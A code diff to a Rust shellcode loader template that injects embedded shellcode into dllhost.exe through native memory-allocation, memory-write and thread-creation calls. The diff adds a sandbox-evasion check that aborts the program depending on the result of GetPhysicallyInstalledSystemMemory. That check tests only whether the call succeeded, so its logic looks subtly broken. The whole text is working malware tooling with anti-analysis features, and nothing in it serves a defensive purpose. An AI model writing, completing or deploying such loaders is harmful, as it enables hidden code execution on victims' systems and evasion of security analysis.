@@ -21,6 +21,8 @@ use ntapi::ntmmapi::NtAllocateVirtualMemory;
 use ntapi::ntmmapi::NtWriteVirtualMemory;
 use ntapi::ntmmapi::NtProtectVirtualMemory;
 use ntapi::ntpsapi::NtCreateThreadEx;
+use winapi::um::sysinfoapi::GetPhysicallyInstalledSystemMemory;
+
 
 {{IMPORTS}}
 
@@ -103,6 +105,15 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
 fn main() {
     // inject in the following processes:
     let tar: &str = "dllhost.exe";
+
+    let mut memory = 0;
+    unsafe {
+        let is_quicksand = GetPhysicallyInstalledSystemMemory(&mut memory);
+        println!("{:#?}", is_quicksand);
+        if is_quicksand != 1 {
+            panic!("Hello.")
+        }
+    }
 
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
     let mut vec: Vec<u8> = Vec::new();
